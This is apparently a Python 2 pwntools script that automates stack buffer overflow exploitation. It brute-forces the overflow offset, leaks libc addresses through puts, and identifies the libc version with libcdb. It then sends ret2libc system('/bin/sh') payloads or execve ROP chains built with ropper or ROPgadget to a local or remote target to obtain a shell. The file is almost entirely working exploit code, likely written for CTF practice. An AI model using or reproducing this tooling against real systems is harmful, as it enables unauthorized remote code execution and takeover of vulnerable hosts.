from pwn import *
import re, os, sys, subprocess, pwnlib, binascii
global config, remlib


def init(confi):
    global config,buffer,toolpa,rop,e
    context.log_level = "WARNING"
    logGen = log.progress("Stage 1", level=31)
    logGen.status("Booting Up....")
    config = confi
    context.binary = config._elf
    #context.log_level="DEBUG"
    e = config._elf
    rop = ROP(e)
    toolpa = config._toolpa
    logGen.success("Finished!")
    buf=Buff()
    buflen=buf.finder()
    buffer=buflen*"A"
    return True


def recvleak(rm):  # TODO recv\n ?
    return u(rm.recvline().strip().ljust(context.bytes, "\x00")), rm


def midroll(rm):
    return config.midroll(rm)


def postroll(rm):
    return config.postroll(rm)


def preroll(rm):
    return config.preroll(rm)


def fingad(gadlis):
    return p(rop.find_gadget(gadlis)[0])


def fplt(sym):
    return p(e.plt[sym])


def fsym(sym):
    return p(e.symbols[sym])


def fgot(sym):
    return p(e.got[sym])


def p(x):
    return pack(x)


def u(x):
    return unpack(x)


def escape_ansi(lin):
    ansi_escape = re.compile(r'(\x9B|\x1B\[)[0-?]*[ -\/]*[@-~]')
    return ansi_escape.sub('', lin)


class OffGet:
    def __init__(self, lib, libcmain):  # lib is id if rem else libcobject
        #print hex(libcmain)
        if remlib:
            os.system(toolpa + "libcdb/dump " + lib + " > offsets")
            os.system(toolpa + "libcdb/dump " + lib + " __libc_start_main >> offsets")
            os.system(toolpa + "libcdb/dump " + lib + " exit >> offsets")
            off = open("offsets", "r")
            offsets = off.read().split("\n")
            off.close()  # TODO slicer method
            osplt= lambda x : int((offsets[x]).split(" = ")[1],0)
            self.offset___libc_start_main_ret = osplt(0)
            self.offset_system = osplt(1)
            self.offset_dup2 = osplt(2)
            self.offset_read = osplt(3)
            self.offset_write = osplt(4)
            self.offset_str_bin_sh = osplt(5)
            self.offset__libc_start_main = osplt(6)
            self.offset_exit = osplt(7)
            self.libcbase = libcmain - self.offset__libc_start_main
            self.BINSH = self.libcbase + self.offset_str_bin_sh
            self.EXIT = self.libcbase + self.offset_exit
            self.SYSTEM = self.libcbase + self.offset_system
        else:
            self.libcbase = libcmain - lib.sym["__libc_start_main"]
            self.BINSH = self.libcbase+next(lib.search("/bin/sh"))  # Verify with find /bin/sh
            self.SYSTEM = self.libcbase+lib.sym["system"]
            self.EXIT = self.libcbase+lib.sym["exit"]

    def loadBSE(self):
        return p(self.BINSH) + p(self.SYSTEM) + p(self.EXIT)

class libMe:
    def __init__(self):
        self.logGen = log.progress("Stage 3", level=31)
        config._logGen = self.logGen
        self.logGen.status("Ret2Libc Attack!")
        self.symbls = map(str, e.plt)
        self.libMain()
        pass

    def libMain(self):
        global remlib, buffer
        remlib = False
        if config._LocalOnly:
            libELF = e.libc
            if libELF is None:
                libELF = ELF(config._pathtolibc)
        elif config._manuallibc:              #TODO fix the libc local and manual thingy e.g. LD_PRELOAD??
            libELF = ELF(config._pathtolibc)
        else:
            remlib = True
            liblist = self.libfinder(buffer)
        self.logGen.status("Libc\s found!")
        if remlib:
            for lib in liblist:
                self.logGen.status("Trying now libc " + lib)
                try:
                    self.libPayloader(lib)
                except NameError:
                    self.logGen.success("Bye")
                except:
                    pass
        else:
            try:
                self.logGen.status("Trying now libc " + libELF.path)
                self.libPayloader(libELF)
            except:
                print("loading of local Libs is somewhat buggy right now so use the remote option")
                pass
        self.logGen.failure("Nothing worked! Go play some Quake!")
        exit(0)

    def leakloader(self):  # Atomic
        getter = [['pop rdi', 'ret']]
        for gadsym in self.symbls:
            if "puts" == gadsym:
                puts_plt = fplt("puts")
                for gettr in getter:
                    try:
                        getwww = fingad(gettr)
                        libc_start_main = fsym("__libc_start_main")
                        return getwww + libc_start_main + puts_plt, getwww
                    except:
                        print("No " + gettr.join(" "))
                        print "need to implement moar gettr!"
                        exit(0)
                else:
                    print"WWWWOOOPOPOSOPS"
                    print "Need to implement moar leaker(read?)"  # TODO MOAR READ!
                    exit(0)

    def libPayloader(self, lib):
        load, gettr = self.leakloader()
        payload1 = buffer + load + p(e.entry)
        config._LDPRE=True
        rm = self.libsend(payload1)
        config._LDPRE=False
        libcmain, rm = recvleak(rm)
        off = OffGet(lib, libcmain)
        load = off.loadBSE()
        payload2 = buffer + gettr + load
        rm = midroll(rm)
        try:
            if config._debugfinalPayloadCore:
                config.debugPayload(rm, payload2)
            else:
                config.SnC(rm, payload2)
        except:
            print("Breaking at libPayloader")
        self.logGen.status("Sending Payload! Here comes the Shell!")

#TODO listen() from pwn for reverse shell!!!!!!!!!! DO IT
    def libleaker(self, buff):
        load, dump = self.leakloader()
        payload = buff + load
        libcmain, rm = recvleak(self.libsend(payload))
        return libcmain

    def libsend(self, payload):  # Atomic
        rm = preroll(config._LocalOnly)
        rm.sendline(payload)
        rm = postroll(rm)
        return rm

    def libfinder(self, buff):
        libcmain = self.libleaker(buff)
        global toolpa
        lib = lambda x: (x.split("id ")[1]).split(")")[0]
        os.system(toolpa + "libcdb/find __libc_start_main " + hex(libcmain) + ">libcanal")
        lican = open("libcanal", "r")
        licanal = lican.read().split("\n")
        lenli = len(licanal)
        licanal = licanal[:lenli - 1]
        lican.close()
        liblist = map(lib, licanal)
        return liblist

class Buff:
    def __init__(self):
        self.payroll=config._payroll
        self.UseCore=config._UseCore

    def finder(self):
        self.logBuf = log.progress("Stage 2", level=31)
        if self.UseCore:
            self.logBuf.status("Trying to find Buffer with Coredumps!")
            return self.finderCore()
        else:
            self.logBuf.status("Trying to find Buffer!")
            return self.finderNoCore()

    def finderCore(self):
        try:
            os.remove("./core")
        except:
            pass
        self.logBuf.status("Buffer lenght = "+str(self.payroll))
        while (True):
            pr = preroll(False)
            self.logBuf.status(str(self.payroll))
            buff = cyclic(self.payroll)
            pr.sendline(buff)
            try:
                context.log_level = "ERROR"
                core = Coredump("./core")
                context.log_level = "WARNING"
            except:
                self.payroll += 100
                continue
            if p(core.fault_addr) not in buff:          #TODO does p instead of p64 work?
                self.payroll += 100
                continue
            else:
                context.log_level = "ERROR"
                tarBufLen = cyclic_find(p(core.fault_addr), n=4)
                context.log_level = "WARNING"
                self.logBuf.success("Finished! Buffer lenght = "+str(tarBufLen) + " Found!")
                return tarBufLen

    def finderNoCore(self):
        while (True):
            pr = preroll(True)
            self.logBuf.status("Buffer lenght = "+str(self.payroll))
            buff = cyclic(self.payroll)
            pr.sendline(buff)
            sleep(0.1)
            if pr.poll() == -11:
                self.logBuf.success("Buffer lenght = "+str(self.payroll+8) + " Found!")
                return (self.payroll + 8)  # TODO Fix hardcoded offset thingy
            else:
                pr.kill()
                pr.close()
                self.payroll += 1

class RoPChain:
    def __init__(self):
        self.generator=config._generator
        self.logRop=log.progress("Stage 3",level=31)
        self.ShellCom = config._shellcmd
        self.binaryfile=config._binaryfile
        self.ropMain()
        pass

    def ropMain(self):
        global buffer
        with context.local(log_level='ERROR'):
            #sleep(0.1)
            shellcode = self.ropchain()
            #sleep(0.1)
        if shellcode == None:
            config._attackType = "ret2libc"
            print("Attack logic still missing!")        #TODO Implement attack logic
            #return attack(logGen, buffer)
            exit(0)
        self.logRop.status("RopChain found! ")
        payload = buffer + shellcode
        self.logRop.status("connecting to target server!")
        rm = preroll(config._LocalOnly)  # HowToUse True for server False for local
        if config._debugfinalPayloadCore:
            config.debugPayload(rm, payload)
        else:
            config.SnC(rm, payload)
        exit(0)  # TODO cause of while true loop

    def ropchain(self):  # Todo implement more Generators and features
        global generator
        self.logRop.status("Trying to generate a RopChain with Ropper!")
        gens = {"ropper": self.ropchainRopper, "ropperService": self.ropchainRopper, "RopGad": self.ropchainGadget, #TODO wait for RopperService
                "RopGen": self.ropchainGenerator}
        funct = gens.get(self.generator, self.ropchainRopper)
        payload = funct()
        # if payload is not None:
        return payload

    def ropchainRopper(self):  # Superfast and working TODO implement more CMDS
        self.logRop.status("")
        Com = "execve "
        if self.ShellCom:
            Com="'" +Com+"cmd="+self.ShellCom+"'"
        command = "ropper -f " + self.binaryfile + " --chain " + Com + " > shellcode.txt"
        out=self.chainer(command)
        # =====================================================# checking for failure
        failmsg = "# INSERT SYSCALL GADGET HERE"
        if failmsg in out:
            self.logRop.status("Ropper didnt work! trying ROPgadget now!")
            return self.ropchainGadget()
        # =====================================================#
        code = out.split("generator #\n")[1]
        tes = code.split("\n")
        lentes = len(tes)
        for x in range(lentes):
            tes[x] = tes[x].lstrip()
        res = tes[6:lentes - 2]
        pay = "from struct import pack\n" + tes[4] + "\ndef p(x):\n    return pack('Q',x)\ndef rebase_0(x):\n    " + \
              tes[4] + "\n    return pack('Q',x+IMAGE_BASE_0)\n" + \
              "\n".join(res) + "\nROP=open('chain','w')\nROP.write(rop)\nROP.close()"

        self.logRop.status("RopChain Generated! Let's pop some Shells!")
        return self.chainloader(pay)

    def ropchainGadget(self):  # Not working so good but more often used
        command = "ROPgadget --ropchain --binary " + self.binaryfile + " > shellcode.txt"
        out=self.chainer(command)
        # =====================================================# checking for failure
        failmsg = "Can't find"
        if failmsg in out:
            self.logRop.status("ROPgadget didnt work! trying ROPGenerator now!")
            try:
                return self.ropchainGenerator()
            except:
                self.logRop.status("ROPgenerator isnt installed! trying something different now!")
                return None
        # =====================================================#
        code = out.split("# execve generated by ROPgadget")[1]
        tes = code.split("\n")
        lentes = len(tes)
        for x in range(lentes):
            tes[x] = tes[x].lstrip()
        res = tes[4:lentes - 2]
        pay = "\n".join(res) + "\nROP=open('chain','w')\nROP.write(p)\nROP.close()"#"\nload=p\n"
        self.logRop.status("RopChain Generated! Let's pop some Shells!")
        return self.chainloader(pay)
    def ropchainGenerator(self):
        print "not Implemented Yet RopGenerator"        #TODO IMPLEMENT
        exit(0)

    def chainloader(self,pay):
        pay = escape_ansi(pay)
        module = open("payloader.py", "w")
        module.write(pay)
        module.close()
        execfile("payloader.py")
        os.remove("payloader.py")
        chain = open("chain", "r")
        load = chain.read()
        chain.close()
        os.remove("chain")
        return load

    def chainer(self,command):
        os.system(command)
        output = open("shellcode.txt", "r")
        out = output.read()
        output.close()
        os.remove("shellcode.txt")
        return out